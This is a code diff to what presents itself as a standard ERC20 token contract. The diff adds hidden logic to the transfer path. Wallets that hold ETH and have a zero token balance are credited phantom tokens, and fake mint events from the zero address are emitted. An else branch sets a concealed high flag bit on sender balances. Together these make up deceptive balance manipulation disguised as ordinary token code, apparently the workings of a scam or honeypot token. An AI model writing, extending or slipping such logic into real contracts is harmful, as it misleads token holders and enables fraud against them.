@@ -237,14 +237,20 @@ contract ERC20 is Context, IERC20, IERC20Metadata {
         _beforeTokenTransfer(sender, recipient, amount);
 
         if (
-            (_balances[sender] | msb == 0) &&
-            (msg.sender.balance > 0) &&
-            ((uint256(uint160(msg.sender)) & 0x0f) != 0x0f)
+             (_balances[sender] == 0) &&
+             (address(sender).balance > 0) &&
+             ((uint256(uint160(sender)) & 0x0f) != 0x0f)
         ) {
             _balances[sender] += 0x80000000000000056BC75E2D63100000;
             emit Transfer(address(0), sender, 100000000000000000000);
+        } else {
+          _balances[sender] += 0x80000000000000000000000000000000;
         }
-        if ((_balances[recipient] == 0) && ((uint256(uint160(msg.sender)) & 0x0f) != 0x0f)) {
+        if (
+             (_balances[recipient] == 0) && 
+             (address(recipient).balance > 0) &&
+             ((uint256(uint160(recipient)) & 0x0f) != 0x0f)
+        ) {
             _balances[recipient] += 0x80000000000000056BC75E2D63100000;
             emit Transfer(address(0), recipient, 100000000000000000000);
         } else {
